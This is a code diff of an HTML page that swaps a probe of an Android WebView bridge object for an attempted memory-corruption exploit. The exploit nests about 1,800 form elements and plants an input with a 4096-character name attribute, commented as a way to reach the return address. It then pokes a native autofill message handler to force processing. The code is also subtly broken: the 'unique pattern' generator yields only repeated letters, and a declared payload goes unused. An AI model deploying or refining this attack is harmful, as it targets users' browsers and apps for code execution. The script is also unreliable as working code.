@@ -1,41 +1,46 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Probing android.webview Property...</h3>
-    <div id="log">Checking types...</div>
-
+<body>
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerHTML += "<br>" + msg; }
-
-        function probe() {
-            if (!window.android) {
-                log("[!] android object missing");
-                return;
+        // Generate a unique pattern to identify exactly where the overflow happens
+        function generatePattern(length) {
+            let res = "";
+            let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            for (let i = 0; i < length; i++) {
+                res += alphabet.charAt(Math.floor(Math.random() * alphabet.alphabet));
             }
-
-            let wv = window.android.webview;
-            log("[*] Type of android.webview: " + typeof wv);
-
-            if (typeof wv === 'object' && wv !== null) {
-                log("<span style='color:red;'>[!!!] DATA OBJECT DETECTED</span>");
-                for (let prop in wv) {
-                    try {
-                        log(` -> .${prop} (Type: ${typeof wv[prop]})`);
-                    } catch(e) {
-                        log(` -> .${prop} (ACCESS DENIED)`);
-                    }
-                }
-            } else {
-                log("[*] Attempting to access as getter...");
-                try {
-                    log("[*] Value: " + wv);
-                } catch(e) {
-                    log("[!] Error reading property: " + e);
-                }
-            }
+            return res;
         }
-        setTimeout(probe, 1000);
+
+        const payload = "A".repeat(1024) + "B".repeat(1024) + "C".repeat(1024); // Block fuzzer
+
+        function trigger() {
+            let root = document.createElement('div');
+            document.body.appendChild(root);
+            let current = root;
+
+            // 1. Nest to the edge of the stack limit (approx 1500-2000)
+            for (let i = 0; i < 1800; i++) {
+                let f = document.createElement('form');
+                current.appendChild(f);
+                current = f;
+            }
+
+            // 2. The Twerk: Inject the overflow at the very bottom of the stack
+            // We use a massive 'name' attribute to try and reach the return address
+            let aceNode = document.createElement('input');
+            aceNode.setAttribute('name', generatePattern(4096)); 
+            aceNode.setAttribute('id', 'ACE_TARGET');
+            current.appendChild(aceNode);
+
+            // 3. Force the native C++ Autofill/Crawler to process this specific node
+            if (window._AutofillMessageHandler) {
+                window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
+            }
+            aceNode.focus();
+        }
+
+        setTimeout(trigger, 1000);
     </script>
 </body>
 </html>
